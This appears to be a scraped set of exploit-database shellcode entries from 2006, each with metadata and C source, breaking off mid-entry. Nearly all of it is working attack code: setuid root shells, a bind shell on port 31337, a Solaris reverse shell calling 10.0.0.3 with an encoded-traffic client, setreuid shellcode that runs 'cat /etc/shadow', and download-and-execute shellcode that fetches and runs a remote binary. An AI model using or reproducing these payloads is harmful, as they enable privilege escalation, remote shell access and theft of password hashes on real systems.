{"Title": "Linux/x86 - setuid(0) + /bin/sh execve() Shellcode (30 bytes)", "Author": "Marco Ivaldi", "Published": ": 2006-07-20", "Platform": "Linux_x86", "Download": "https://old.exploit-db.com/download/13359.c", "View": "https://old.exploit-db.com/raw/13359/", "code": ["/*", " * $Id: setuid-linux.c,v 1.4 2004/06/02 12:22:30 raptor Exp $", " *", " * setuid-linux.c - setuid/execve shellcode for Linux/x86", " * Copyright (c) 2004 Marco Ivaldi <raptor@0xdeadbeef.info>", " *", " * Short fully-functional setuid(0) and /bin/sh execve() shellcode.", " */", "", "/* ", " * setuid(0)", " *", " * 8049380:       6a 17                   push   $0x17", " * 8049382:       58                      pop    %eax", " * 8049383:       31 db                   xor    %ebx,%ebx", " * 8049385:       cd 80                   int    $0x80", " *", " * execve(\"/bin//sh\", [\"/bin//sh\"], NULL)", " *", " * 8049387:       6a 0b                   push   $0xb", " * 8049389:       58                      pop    %eax", " * 804938a:       99                      cltd   ", " * 804938b:       52                      push   %edx", " * 804938c:       68 2f 2f 73 68          push   $0x68732f2f", " * 8049391:       68 2f 62 69 6e          push   $0x6e69622f", " * 8049396:       89 e3                   mov    %esp,%ebx", " * 8049398:       52                      push   %edx", " * 8049399:       53                      push   %ebx", " * 804939a:       89 e1                   mov    %esp,%ecx", " * 804939c:       cd 80                   int    $0x80", " */", "", "char sc[] = /* 7 + 23 = 30 bytes */", "\"\\x6a\\x17\\x58\\x31\\xdb\\xcd\\x80\"", "\"\\x6a\\x0b\\x58\\x99\\x52\\x68//sh\\x68/bin\\x89\\xe3\\x52\\x53\\x89\\xe1\\xcd\\x80\";", "", "main()", "{", "\tint (*f)() = (int (*)())sc; f();", "}", "", "// milw0rm.com [2006-07-20]"]},
{"Title": "Linux/x86 - Bind (31337/TCP) Shell (/bin/sh) + setuid() Shellcode (96 bytes)", "Author": "Marco Ivaldi", "Published": ": 2006-07-20", "Platform": "Linux_x86", "Download": "http://shell-storm.org/shellcode/files/shellcode-217.php", "View": null, "code": ["/*", " * $Id: portbind-linux.c,v 1.4 2004/06/02 12:22:30 raptor Exp $", " *", " * portbind-linux.c - setuid/portbind shellcode for Linux/x86", " * Copyright (c) 2003 Marco Ivaldi <raptor@0xdeadbeef.info>", " *", " * Simple portbind shellcode that bind()'s a setuid(0) shell on", " * port 31337/tcp (based on bighawk's code).", " *", " * Tested on Linux.", " */", "", "/*", " * setuid(0)", " *", " * 8049380:       31 c0                   xor    %eax,%eax", " * 8049382:       31 db                   xor    %ebx,%ebx", " * 8049384:       b0 17                   mov    $0x17,%al", " * 8049386:       cd 80                   int    $0x80", " *", " * socket(AF_INET, SOCK_STREAM, 0)", " *", " * 8049388:       31 db                   xor    %ebx,%ebx", " * 804938a:       f7 e3                   mul    %ebx", " * 804938c:       b0 66                   mov    $0x66,%al", " * 804938e:       53                      push   %ebx", " * 804938f:       43                      inc    %ebx", " * 8049390:       53                      push   %ebx", " * 8049391:       43                      inc    %ebx", " * 8049392:       53                      push   %ebx", " * 8049393:       89 e1                   mov    %esp,%ecx", " * 8049395:       4b                      dec    %ebx", " * 8049396:       cd 80                   int    $0x80", " *", " * bind(s, server, sizeof(server))", " *", " * 8049398:       89 c7                   mov    %eax,%edi", " * 804939a:       52                      push   %edx", " * 804939b:       66 68 7a 69             pushw  $0x697a", " * 804939f:       43                      inc    %ebx", " * 80493a0:       66 53                   push   %bx", " * 80493a2:       89 e1                   mov    %esp,%ecx", " * 80493a4:       b0 10                   mov    $0x10,%al", " * 80493a6:       50                      push   %eax", " * 80493a7:       51                      push   %ecx", " * 80493a8:       57                      push   %edi", " * 80493a9:       89 e1                   mov    %esp,%ecx", " * 80493ab:       b0 66                   mov    $0x66,%al", " * 80493ad:       cd 80                   int    $0x80", " *", " * listen(s, 1)", " *", " * 80493af:       b0 66                   mov    $0x66,%al", " * 80493b1:       b3 04                   mov    $0x4,%bl", " * 80493b3:       cd 80                   int    $0x80", " *", " * accept(s, 0, 0)", " *", " * 80493b5:       50                      push   %eax", " * 80493b6:       50                      push   %eax", " * 80493b7:       57                      push   %edi", " * 80493b8:       89 e1                   mov    %esp,%ecx", " * 80493ba:       43                      inc    %ebx", " * 80493bb:       b0 66                   mov    $0x66,%al", " * 80493bd:       cd 80                   int    $0x80", " *", " * dup2(c, 2)", " * dup2(c, 1)", " * dup2(c, 0)", " *", " * 80493bf:       89 d9                   mov    %ebx,%ecx", " * 80493c1:       89 c3                   mov    %eax,%ebx", " * 80493c3:       b0 3f                   mov    $0x3f,%al", " * 80493c5:       49                      dec    %ecx", " * 80493c6:       cd 80                   int    $0x80", " * 80493c8:       41                      inc    %ecx", " * 80493c9:       e2 f8                   loop   80493c3 <sc+0x43>", " *", " * execve(\"/bin/sh\", [\"/bin/sh\"], NULL)", " *", " * 80493cb:       51                      push   %ecx", " * 80493cc:       68 6e 2f 73 68          push   $0x68732f6e", " * 80493d1:       68 2f 2f 62 69          push   $0x69622f2f", " * 80493d6:       89 e3                   mov    %esp,%ebx", " * 80493d8:       51                      push   %ecx", " * 80493d9:       53                      push   %ebx", " * 80493da:       89 e1                   mov    %esp,%ecx", " * 80493dc:       b0 0b                   mov    $0xb,%al", " * 80493de:       cd 80                   int    $0x80", " * 80493e0:       00 00                   add    %al,(%eax)", " */", "", "char sc[] = /* 8 + 88 = 96 bytes */", "\"\\x31\\xc0\\x31\\xdb\\xb0\\x17\\xcd\\x80\"", "\"\\x31\\xdb\\xf7\\xe3\\xb0\\x66\\x53\\x43\\x53\\x43\\x53\\x89\\xe1\\x4b\\xcd\\x80\"", "\"\\x89\\xc7\\x52\\x66\\x68\"", "\"\\x7a\\x69\" // port 31337/tcp, change if needed", "\"\\x43\\x66\\x53\\x89\\xe1\\xb0\\x10\\x50\\x51\\x57\\x89\\xe1\\xb0\\x66\\xcd\\x80\"", "\"\\xb0\\x66\\xb3\\x04\\xcd\\x80\"", "\"\\x50\\x50\\x57\\x89\\xe1\\x43\\xb0\\x66\\xcd\\x80\"", "\"\\x89\\xd9\\x89\\xc3\\xb0\\x3f\\x49\\xcd\\x80\"", "\"\\x41\\xe2\\xf8\\x51\\x68n/sh\\x68//bi\\x89\\xe3\\x51\\x53\\x89\\xe1\\xb0\\x0b\\xcd\\x80\";", "", "main()", "{", "\tint (*f)() = (int (*)())sc; f();", "}", "", "// milw0rm.com [2006-07-20]"]},
{"Title": "Solaris/MIPS - Reverse (10.0.0.3:44434/TCP) Shell + XNOR Encoded Traffic Shellcode (600 bytes) (Generator)", "Author": "xort", "Published": ": 2006-07-21", "Platform": "Generator", "Download": "http://shell-storm.org/shellcode/files/shellcode-241.php", "View": null, "code": ["/*", "", " black-RXenc-con-back-SOLARIS.c (MIPS)", "", " This is a relitivly small (600 byte) shellcode that encodes all network trafic between the", " exploited process and the attacker. All clear-text shell i/o is encoded using a simple NOT", " algo before being transmitted on the wire.", "", " 7.21.6  Russell Sanford  (xort@blacksecurity.org)", "", "*/", "", "", "", "#include <sys/socket.h>", "#include <netinet/in.h>", "#include <arpa/inet.h>", "", "// opcode encodings for performing sethi/or against/into register %o1 w/ nulled data", "", "#define SETHI_O1 0x13000000", "#define OR_O1\t 0x92126000", "", "char rx_enc_con_back[] =", "\"\\x13\\x04\\xbd\\xd0\\x93\\x32\\x60\\x0c\\xd2\\x23\\xbf\\xd4\\x13\\x1b\\x5c\\x0b\\x92\\x12\\x63\\x50\\xd2\\x23\\xbf\\xd8\\xc0\\x23\\xbf\\xdc\\x20\\xbf\\xff\\xff\"", "\"\\x20\\xbf\\xff\\xff\\x7f\\xff\\xff\\xff\\x9e\\x03\\xe0\\x90\\x20\\xbf\\xff\\xfb\\x81\\xc3\\xe0\\x04\\x96\\x1a\\xc0\\x0b\\x81\\xc3\\xff\\x1c\\x92\\x10\\x20\\x02\"", "\"\\x94\\x1a\\x80\\x0a\\x96\\x1a\\xc0\\x0b\\x98\\x10\\x20\\x01\\x82\\x10\\x20\\xe6\\x91\\xd0\\x20\\x08\\x80\\x1a\\xc0\\x0b\\x81\\xc3\\xe0\\x08\\x80\\x1a\\xc0\\x0b\"", "\"\\x82\\x10\\x20\\x02\\x91\\xd0\\x20\\x08\\x96\\x1a\\xc0\\x0b\\x80\\x92\\xc0\\x09\\x12\\xbf\\xff\\xf0\\x96\\x1a\\xc0\\x0b\\x7f\\xff\\xff\\xf1\\x90\\x10\\x20\\x01\"", "\"\\xd0\\x23\\xbf\\xcc\\xe0\\x03\\xbf\\xcc\\x90\\x03\\xbf\\xd6\\x82\\x10\\x20\\x0a\\x91\\xd0\\x20\\x08\\xd0\\x03\\xbf\\xcc\\x92\\x03\\xbf\\xd4\\x94\\x10\\x20\\x08\"", "\"\\x96\\x10\\x20\\x03\\x98\\x1a\\xc0\\x0b\\x82\\x10\\x20\\xe8\\x91\\xd0\\x20\\x08\\xd0\\x03\\xbf\\xcc\\x92\\x10\\x20\\x01\\x94\\x10\\x20\\x01\\x82\\x10\\x20\\xe9\"", "\"\\x91\\xd0\\x20\\x08\\xd0\\x03\\xbf\\xcc\\x92\\x03\\xbf\\xd4\\x94\\x10\\x20\\x28\\xd4\\x23\\xbf\\xd0\\x94\\x03\\xbf\\xd0\\x96\\x10\\x20\\x01\\x82\\x10\\x20\\xea\"", "\"\\x91\\xd0\\x20\\x08\\xd0\\x23\\xbf\\xcc\\x94\\x10\\x20\\x01\\x92\\x10\\x20\\x09\\x82\\x10\\x20\\x3e\\x91\\xd0\\x20\\x08\\xd0\\x03\\xbf\\xcc\\x94\\x22\\xc0\\x0b\"", "\"\\x91\\xd0\\x20\\x08\\xd0\\x03\\xbf\\xcc\\x94\\x10\\x20\\x02\\x91\\xd0\\x20\\x08\\x94\\x1a\\x80\\x0a\\x21\\x0b\\xd8\\x9a\\xa0\\x14\\x21\\x6e\\x23\\x0b\\xcb\\xdc\"", "\"\\xa2\\x14\\x63\\x68\\xd4\\x23\\xbf\\xd0\\xe2\\x23\\xbf\\xcc\\xe0\\x23\\xbf\\xc8\\x90\\x23\\xa0\\x38\\xd4\\x23\\xbf\\xc4\\xd0\\x23\\xbf\\xc0\\x92\\x23\\xa0\\x40\"", "\"\\x82\\x10\\x20\\x0b\\x91\\xd0\\x20\\x08\\x90\\x10\\x20\\x03\\xd0\\x23\\xbf\\xf8\\x90\\x03\\xbf\\xf8\\x92\\x1a\\x40\\x09\\x82\\x10\\x20\\xc7\\x91\\xd0\\x20\\x08\"", "\"\\x7f\\xff\\xff\\xb7\\x90\\x10\\x20\\x01\\x80\\x18\\x40\\x02\\xd0\\x23\\xbf\\x80\\x92\\x03\\xbf\\xd4\\x94\\x10\\x20\\x08\\x82\\x10\\x20\\xeb\\x91\\xd0\\x20\\x08\"", "\"\\x7f\\xff\\xff\\xaf\\x90\\x10\\x20\\x02\\xd0\\x23\\xbf\\xf8\\x13\\x0a\\xb6\\x48\\x93\\x32\\x60\\x0c\\xd2\\x23\\xbf\\xec\\x13\\x24\\x28\\x9e\\x92\\x12\\x60\\xd7\"", "\"\\xd2\\x23\\xbf\\xf0\\xc0\\x23\\xbf\\xf4\\x92\\x03\\xbf\\xec\\x94\\x10\\x20\\x10\\x82\\x10\\x20\\xeb\\x91\\xd0\\x20\\x08\\xe4\\x03\\xbf\\xf8\\xe2\\x03\\xbf\\x80\"", "\"\\xe2\\x23\\xbf\\xf8\\xe4\\x23\\xbf\\x80\\x94\\x10\\x20\\x01\\x91\\x2a\\xa0\\x10\\xd0\\x23\\xbf\\xfc\\x90\\x03\\xbf\\xf8\\x92\\x10\\x20\\x01\\x84\\x3a\\xc0\\x0b\"", "\"\\x82\\x10\\x20\\x57\\x91\\xd0\\x20\\x08\\x92\\x18\\x40\\x01\\x80\\xa2\\x40\\x08\\x02\\xbf\\xff\\xf2\\xd0\\x03\\xbf\\xf8\\x92\\x03\\xbf\\x88\\x94\\x10\\x20\\x64\"", "\"\\x82\\x10\\x20\\x03\\x91\\xd0\\x20\\x08\\x92\\x18\\x40\\x01\\x80\\xa2\\x40\\x08\\x02\\xbf\\xff\\xea\\x92\\x10\\x3f\\x9c\\x9e\\x03\\xbf\\xec\\xd6\\x03\\xc0\\x09\"", "\"\\x82\\x22\\xc0\\x0b\\x96\\x3a\\xc0\\x01\\xd6\\x23\\xc0\\x09\\x80\\xa2\\x40\\x01\\x12\\xbf\\xff\\xfb\\x92\\x02\\x60\\x04\\x94\\x0a\\x3f\\xff\\xd0\\x03\\xbf\\x80\"", "\"\\x92\\x03\\xbf\\x88\\x82\\x10\\x20\\x04\\x91\\xd0\\x20\\x08\\x10\\xbf\\xff\\xdb\\x80\\x18\\x40\\x02\";", "", "", "void patchcode(long ip, unsigned short port) {", "", "", "\t// fix sethi instruction to set up ip.", "\t*(long *)&rx_enc_con_back[408] = SETHI_O1 + ((ip)>>10 & 0x3fffff);", "", "\t// FIX or instruction to set up ip.", "\t*(long *)&rx_enc_con_back[412] = OR_O1 + (ip & 0x2ff);", "", "\t// fix sethi instruction to set up port/family.", "\t*(long *)&rx_enc_con_back[396] = SETHI_O1 + (((AF_INET<<16) + port)<<2);", "", "}", "", "void (*fakefunc)();", "", "void main() {", "", "\tpatchcode(inet_addr(\"10.0.0.3\"), 44434);", "\tchar *buffer = (char *) malloc(1024);", "\tstrcpy(buffer, rx_enc_con_back);", "\tfakefunc = buffer;", "\tfakefunc();", "}", "", "", "/*", "// quickclient.c - client for remote connect back solaris shellcode //", "//                 w/ realtime encoded communications.              //", "// xort@blacksecurity.org - 7.17.6                                  //", "", "#include <stdio.h>", "#include <unistd.h>", "#include <stdlib.h>", "#include <errno.h>", "#include <string.h>", "#include <time.h>", "#include <sys/types.h>", "#include <sys/socket.h>", "#include <netinet/in.h>", "#include <arpa/inet.h>", "#include <signal.h>", "", "#define PORT 44434", "", "// simple routine to do NOT opperation on all data passed/revieved.", "", "void notbuffer(char *string) {", "", "\tint i;", "", "\tfor (i=0; i<100; i+=4)", "\t\t*(int *)(string+i) = ~ *(int *)(string+i);", "}", "", "", "void main() {", "", "", "\tstruct sockaddr_in mine;", "\tint sockfd;", "\tchar buffer[100];", "\tint len, sent, l;", "\tfd_set rfds, wfds;", "", "\tmine.sin_family = AF_INET;", "\tmine.sin_port = htons(PORT);", "\tmine.sin_addr.s_addr = 0;", "\tbzero(mine.sin_zero, 8);", "\t", "\tsockfd = socket(AF_INET, SOCK_STREAM, 0);", "", "\tlen = sizeof(mine);", "\tbind(sockfd, (struct sockaddr *)&mine, sizeof(mine));\t", "\tlisten(sockfd, 1);", "\tsockfd = accept(sockfd, 0, &len);", "", "         while (1) {", "                FD_SET (0, &rfds);", "                FD_SET (sockfd, &rfds);", "                FD_SET (sockfd, &wfds);", "", "                select (sockfd + 1, &rfds, NULL, NULL, NULL);", "", "                if (FD_ISSET (0, &rfds)) {", "                        l = read (0, buffer, sizeof (buffer));", "\t\t\tnotbuffer(buffer);", "                        if (l <= 0) {", "                                exit (EXIT_FAILURE);", "                        }", "                        sent=0;", "                        while (!sent) {", "                                select (sockfd+1, NULL, &wfds, NULL, NULL);", "                                if (FD_ISSET(sockfd, &wfds)) {", "                                        write(sockfd, buffer, l);", "                                        sent=1;", "                                }", "                        }", "                }", "", "                if (FD_ISSET (sockfd, &rfds)) {", "                        l = read (sockfd, buffer, sizeof (buffer));", "\t\t\tnotbuffer(buffer);", "                        if (l == 0) {", "                                fprintf(stdout,\"\\n [x] Connection Closed By Remote Host.\\n\");", "                                exit (EXIT_FAILURE);", "                        } else if (l < 0) {", "                                exit (EXIT_FAILURE);", "                        }", "                        write (1, buffer, l);", "                }", "        }", "", "}", "*/", "", "// milw0rm.com [2006-07-21]"]},
{"Title": "Linux/x86 - setreuid() + Executes Command Shellcode (49+ bytes)", "Author": "bunker", "Published": ": 2006-08-02", "Platform": "Linux_x86", "Download": "http://shell-storm.org/shellcode/files/shellcode-216.php", "View": null, "code": ["/*", " * bunker_exec.c V1.3 - Tue Mar 21 22:50:18 CET 2006", " *", " * Linux/x86 bytecode that executes command after setreuid", " * (9 + 40 bytes + cmd)", " * ", " * setreuid(0, 0) + execve(\"/bin//sh\", [\"/bin//sh\",\"-c\",\"cmd\"], NULL);", " *", " * \"cmd\" MUST be terminated with \";\" (better with \";exit;\" :-D)", " *", " * bunker - http://rawlab.mindcreations.com", " * 37F1 A7A1 BB94 89DB A920  3105 9F74 7349 AF4C BFA2", " *", " * setreuid(0, 0);", " * 00000000  6a46              push byte +0x46", " * 00000002  58                pop eax", " * 00000003  31db              xor ebx,ebx", " * 00000005  31c9              xor ecx,ecx", " * 00000007  cd80              int 0x80", " *", " * execve(\"/bin//sh\", [\"/bin//sh\", \"-c\", \"cmd\"], NULL);", " * 00000009  eb21              jmp short 0x2c", " * 0000000b  5f                pop edi", " * 0000000c  6a0b              push byte +0xb", " * 0000000e  58                pop eax", " * 0000000f  99                cdq", " * 00000010  52                push edx", " * 00000011  66682d63          push word 0x632d", " * 00000015  89e6              mov esi,esp", " * 00000017  52                push edx", " * 00000018  682f2f7368        push dword 0x68732f2f", " * 0000001d  682f62696e        push dword 0x6e69622f", " * 00000022  89e3              mov ebx,esp", " * 00000024  52                push edx", " * 00000025  57                push edi", " * 00000026  56                push esi", " * 00000027  53                push ebx", " * 00000028  89e1              mov ecx,esp", " * 0000002a  cd80              int 0x80", " * 0000002c  e8daffffff        call 0xb", " * 00000031  ....              \"cmd; exit;\"", " */", "", "char sc[]=", "\"\\x6a\\x46\\x58\\x31\\xdb\\x31\\xc9\\xcd\\x80\\xeb\\x21\\x5f\\x6a\\x0b\\x58\\x99\" ", "\"\\x52\\x66\\x68\\x2d\\x63\\x89\\xe6\\x52\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\"", "\"\\x69\\x6e\\x89\\xe3\\x52\\x57\\x56\\x53\\x89\\xe1\\xcd\\x80\\xe8\\xda\\xff\\xff\\xff\"", "\"cat /etc/shadow; exit;\";", "", "main() { int(*f)()=(int(*)())sc;f(); }", "", "// milw0rm.com [2006-08-02]"]},
{"Title": "Solaris/SPARC - setreuid() + Executes Command Shellcode (92+ bytes)", "Author": "bunker", "Published": ": 2006-10-21", "Platform": "Solaris_SPARC", "Download": "https://old.exploit-db.com/download/13490.c", "View": "https://old.exploit-db.com/raw/13490/", "code": ["/*", " * bunker_sparc_exec.c V1.0 - Sat Oct 21 17:45:27 CEST 2006", " *", " * Solaris/sparc bytecode that executes command after setreuid", " * (92 bytes + cmd)", " * ", " * setreuid(0, 0) + execve(\"/bin/sh\", [\"/bin/sh\",\"-c\",\"cmd\"], NULL);", " *", " * bunker - http://rawlab.mindcreations.com", " * 37F1 A7A1 BB94 89DB A920  3105 9F74 7349 AF4C BFA2", " *", " * Load address of _start+12 in %o7", " *  0x10250:            20 bf ff ff  bn,a      -0x4     <0x1024c>", " *  0x10254:            20 bf ff ff  bn,a      -0x4     <0x10250>", " *  0x10258:            7f ff ff ff  call      -0x4     <0x10254>", " *", " * setreuid(0, 0);", " *  0x1025c:            90 18 40 01  xor       %g1, %g1, %o0", " *  0x10260:            92 18 40 01  xor       %g1, %g1, %o1", " *  0x10264:            82 10 20 ca  mov       0xca, %g1", " *  0x10268:            91 d0 20 08  ta        0x8", " *", " * execve(\"/bin/sh\", [\"/bin/sh\", \"-c\", \"cmd\"], NULL);", " *  0x1026c:            90 03 e0 44  add       %o7, 0x44, %o0", " *  0x10270:            90 23 e0 20  sub       %o7, 0x20, %o0", " *  0x10274:            a2 02 20 0c  add       %o0, 0xc, %l1", " *  0x10278:            a4 02 20 10  add       %o0, 0x10, %l2", " *  0x1027c:            c0 2a 20 07  clrb      [%o0 + 0x7]", " *  0x10280:            c0 2a 20 0e  clrb      [%o0 + 0xe]", " *  0x10284:            d0 23 ff e0  st        %o0, [%o7 - 0x20]", " *  0x10288:            e2 23 ff e4  st        %l1, [%o7 - 0x1c]", " *  0x1028c:            e4 23 ff e8  st        %l2, [%o7 - 0x18]", " *  0x10290:            c0 23 ff ec  clr       [%o7 - 0x14]", " *  0x10294:            82 10 20 3b  mov       0x3b, %g1", " *  0x10298:            91 d0 20 08  ta        0x8", " * \"/bin/sh     -c  \"", " * \"cat /etc/shadow\"", " */", "", "char sc[]=      \"\\x20\\xbf\\xff\\xff\\x20\\xbf\\xff\\xff\\x7f\\xff\\xff\\xff\"", "\"\\x90\\x18\\x40\\x01\\x92\\x18\\x40\\x01\\x82\\x10\\x20\\xca\\x91\\xd0\\x20\\x08\"", "\"\\x90\\x03\\xe0\\x44\\x92\\x23\\xe0\\x20\\xa2\\x02\\x20\\x0c\\xa4\\x02\\x20\\x10\"", "\"\\xc0\\x2a\\x20\\x07\\xc0\\x2a\\x20\\x0e\\xd0\\x23\\xff\\xe0\\xe2\\x23\\xff\\xe4\"", "\"\\xe4\\x23\\xff\\xe8\\xc0\\x23\\xff\\xec\\x82\\x10\\x20\\x3b\\x91\\xd0\\x20\\x08\"", "\"\\x2f\\x62\\x69\\x6e\\x2f\\x73\\x68\\x20\\x20\\x20\\x20\\x20\\x2d\\x63\\x20\\x20\"", "\"cat /etc/shadow\";", "", "main() { int(*f)()=(int(*)())sc;f(); }", "", "// milw0rm.com [2006-10-21]"]},
{"Title": "Linux/x86 - HTTP/1.x Requests Shellcode (18+/26+ bytes) (Generator)", "Author": "izik", "Published": ": 2006-10-22", "Platform": "Generator", "Download": "https://old.exploit-db.com/download/13288.c", "View": "https://old.exploit-db.com/raw/13288/", "code": ["/*", " * gen_httpreq.c, utility for generating HTTP/1.x requests for shellcodes", " *", " * SIZES: ", " *", " * \tHTTP/1.0 header request size - 18 bytes+", " * \tHTTP/1.1 header request size - 26 bytes+", " *", " * NOTE: The length of the selected HTTP header is stored at EDX register. ", " *       Thus the generated MOV instruction (to EDX/DX/DL) is size-based. ", " *", " * - izik@tty64.org", " */", "", "#include <stdio.h>", "#include <stdlib.h>", "#include <unistd.h>", "#include <stdarg.h>", "#include <string.h>", "", "#define X86_PUSH \\", "\t0x68", "", "#define X86_MOV_TO_DL(x) \\", "\tprintf(\"\\t\\\"\\\\xb2\\\\x%02x\\\"\\n\", x & 0xFF);", "", "#define X86_MOV_TO_DX(x) \\", "\tprintf(\"\\t\\\"\\\\x66\\\\xba\\\\x%02x\\\\x%02x\\\"\\n\", \\", "\t(x & 0xFF), ((x >> 8) & 0xFF));", "", "#define X86_MOV_TO_EDX(x) \\", "\tprintf(\"\\t\\\"\\\\xba\\\\x%02x\\\\x%02x\\\\x%02x\\\\x%02x\\\"\\n\", \\", "\t(x & 0xFF), ((x >> 8) & 0xFF), ((x >> 16) & 0xFF), ((x >> 24) & 0xFF));", "", "void usage(char *);", "int printx(char *fmt, ...);", "", "int main(int argc, char **argv) {", "", "\tif (argc < 2) {", "\t\tusage(argv[0]);", "\t\treturn -1;", "\t}", "", "\tif (argv[2][0] != '/') {", "", "\t\tfprintf(stderr, \"filename must begin with '/' as any sane URL! (e.g. /index.html)\\n\");", "", "\t\treturn -1;", "\t}", "", "\tif (!strcmp(argv[1], \"-0\")) {", "", "\t\treturn printx(\"GET %s HTTP/1.0\\r\\n\\r\\n\", argv[2]);", "\t}", "", "\tif (!strcmp(argv[1], \"-1\")) {", "", "\t\tif (argc != 4) {", "", "\t\t\tfprintf(stderr, \"missing <host>, required parameter for HTTP/1.1 header! (e.g. www.tty64.org)\\n\");", "", "\t\t\treturn -1;", "\t\t}", "", "\t\treturn printx(\"GET %s HTTP/1.1\\r\\nHost: %s\\r\\n\\r\\n\", argv[2], argv[3]);", "\t}", "", "\tfprintf(stderr, \"%s: unknown http protocol, try -0 or -1\\n\", argv[1]);", "", "\treturn -1;", "}", "", "/*", " * usage, display usage screen", " * * basename, barrowed argv[0]", " */", "", "void usage(char *basename) {", "", "\tprintf(", "\t\t\"usage: %s <-0|-1> <filename> [<host>]\\n\\n\"", "\t\t\"\\t -0, HTTP/1.0 GET request\\n\"", "\t\t\"\\t -1, HTTP/1.1 GET request\\n\"", "\t\t\"\\t <filename>, given filename (e.g. /shellcode.bin)\\n\"", "\t\t\"\\t <host>, given hostname (e.g. www.tty64.org) [required for HTTP 1.1]\\n\\n\",", "\t\tbasename);", "", "\treturn ;", "}", "", "/*", " * printx, fmt string. generate the shellcode chunk", " * * fmt, given format string", " */", "", "int printx(char *fmt, ...) {", "        va_list ap;", "        char buf[256], pad_buf[4], *w_buf;", "\tint pad_length, buf_length, i, tot_length;", "", "\tmemset(buf, 0x0, sizeof(buf));", "", "        va_start(ap, fmt);", "        vsnprintf(buf, sizeof(buf), fmt, ap);", "        va_end(ap);", "", "\tbuf_length = strlen(buf);", "", "\tprintf(\"\\nURL: %s\\n\", buf);", "\tprintf(\"Header Length: %d bytes\\n\", buf_length);", "", "\tfor (i = 1; buf_length > (i * 4); i++) {", "\t\tpad_length = ((i+1)*4) - buf_length;", "\t}", "", "\tprintf(\"Padding Length: %d bytes\\n\\n\", pad_length);", "", "\ttot_length = buf_length + pad_length;", "", "\tw_buf = buf;", "", "\tif (pad_length) {", "", "\t\tw_buf = calloc(tot_length, sizeof(char));", "", "\t\tif (!w_buf) {", "", "\t\t\tperror(\"calloc\");", "\t\t\treturn -1;", "\t\t}", "", "\t\ti = index(buf, '/') - buf;", "", "\t\tmemset(pad_buf, 0x2f, sizeof(pad_buf));", "", "\t\tmemcpy(w_buf, buf, i);", "\t\tmemcpy(w_buf+i, pad_buf, pad_length);", "\t\tmemcpy(w_buf+pad_length+i, buf+i, buf_length - i);", "\t}", "", "\tfor (i = tot_length - 1; i > -1; i-=4) {", "", "\t\tprintf(\"\\t\\\"\\\\x%02x\\\\x%02x\\\\x%02x\\\\x%02x\\\\x%02x\\\" // pushl $0x%02x%02x%02x%02x\\n\",", "\t\t\tX86_PUSH, w_buf[i-3], w_buf[i-2], w_buf[i-1], w_buf[i], w_buf[i-3], w_buf[i-2], w_buf[i-1], w_buf[i]);", "\t}", "", "\tif (pad_length) {", "", "\t\tfree(w_buf);", "\t}", "", "\t//", "\t// The EDX register is assumed to be zero-out within the shellcode.", "\t//", "", "\tif (tot_length < 256) {", "", "\t\t// 8bit value", "", "\t\tX86_MOV_TO_DL(tot_length);", "", "\t} else if (tot_length < 655356) {", "", "\t\t// 16bit value", "", "\t\tX86_MOV_TO_DX(tot_length);", "", "\t} else {", "", "\t\t// 32bit value, rarely but possible ;-)", "", "\t\tX86_MOV_TO_EDX(tot_length);", "", "\t}", "", "\tfputc('\\n', stdout);", "\t", "\treturn 1;", "}", "", "// milw0rm.com [2006-10-22]"]},
{"Title": "Linux/x86 - Download File (HTTP/1.x http://0xdeadbeef/A) + execve() + Null-Free Shellcode (111+ bytes)", "Author": "izik", "Published": ": 2006-10-22", "Platform": "Linux_x86", "Download": "http://shell-storm.org/shellcode/files/shellcode-59.php", "View": null, "code": ["/*", " * (linux/x86) - HTTP/1.x GET, Downloads and execve() - 111 bytes+", " *", " * This shellcode allows you to download a ELF executable straight off a standard HTTP server", " * and launch it. It will saved locally it into a filename called 'A' in the current directory.", " * ", " * <CONFIGURATION>", " *", " * > The destination IP of the HTTP server is required (NO DNS!), use inet_addr() function result and ", " *   modify the value in [1*] from 0xdeadbeef to the actual IP, if the IP contains NULLs then a little ", " *   workaround requires. The simplest is to use ~inet_addr() followed by ``notl (%esp)`` to change back. ", " *", " * > The destination port of the HTTP server is 80 by default, it is located within the 4 upper bytes", " *   of the value in [2*] (0xafff). Stored in an invert format (~), so if any further modification ", " *   needed make sure to keep it stored in the same format.", " *", " * > The destination URL should be generated using the ``gen_httpreq`` utility. It will produce an", " *   assembly code which is a series of PUSH's and should be pasted as it is within in the marked place", " *   in the shellcode (look for the comment).", " * ", " * <LINKS/UTILITIES>:", " *", " *      gen_httpreq.c, generates a HTTP GET request for this shellcode", " *      > http://www.tty64.org/code/shellcodes/utilities/gen_httpreq.c", " *\tbackup", " *\t> http://www.milw0rm.com/shellcode/2618", " *", " * - izik <izik@tty64.org>", " */", "", "char shellcode[] = ", "", "\t\"\\x6a\\x66\"              // push $0x66 ", "\t\"\\x58\"                  // pop %eax ", "\t\"\\x99\"                  // cltd ", "\t\"\\x6a\\x01\"              // push $0x1 ", "\t\"\\x5b\"                  // pop %ebx ", "\t\"\\x52\"                  // push %edx ", "\t\"\\x53\"                  // push %ebx ", "\t\"\\x6a\\x02\"              // push $0x2 ", "\t\"\\x89\\xe1\"              // mov %esp,%ecx ", "\t\"\\xcd\\x80\"              // int $0x80 ", "\t\"\\x5b\"                  // pop %ebx ", "\t\"\\x5e\"                  // pop %esi ", "\t\"\\x68\\xef\\xbe\\xad\\xde\"  // [1*] push $0xdeadbeef", "\t\"\\xbd\\xfd\\xff\\xff\\xaf\"  // [2*] mov $0xaffffffd,%ebp ", "\t\"\\xf7\\xd5\"              // not %ebp ", "\t\"\\x55\"                  // push %ebp ", "\t\"\\x43\"                  // inc %ebx ", "\t\"\\x6a\\x10\"              // push $0x10 ", "\t\"\\x51\"                  // push %ecx ", "\t\"\\x50\"                  // push %eax ", "\t\"\\xb0\\x66\"              // mov $0x66,%al ", "\t\"\\x89\\xe1\"              // mov %esp,%ecx ", "\t\"\\xcd\\x80\"              // int $0x80 ", "\t\"\\x5f\"                  // pop %edi ", "\t\"\\xb0\\x08\"              // mov $0x8,%al ", "\t\"\\x52\"                  // push %edx ", "\t\"\\x6a\\x41\"              // push $0x41 ", "\t\"\\x89\\xe3\"              // mov %esp,%ebx ", "\t\"\\x50\"                  // push %eax ", "\t\"\\x59\"                  // pop %ecx ", "\t\"\\xcd\\x80\"              // int $0x80 ", "\t\"\\x96\"                  // xchg %eax,%esi ", "\t\"\\x87\\xdf\"              // xchg %ebx,%edi ", "", "\t//", "\t// <paste here the code, that gen_httpreq.c outputs!>", "\t//", "", "\t\"\\xb0\\x04\"      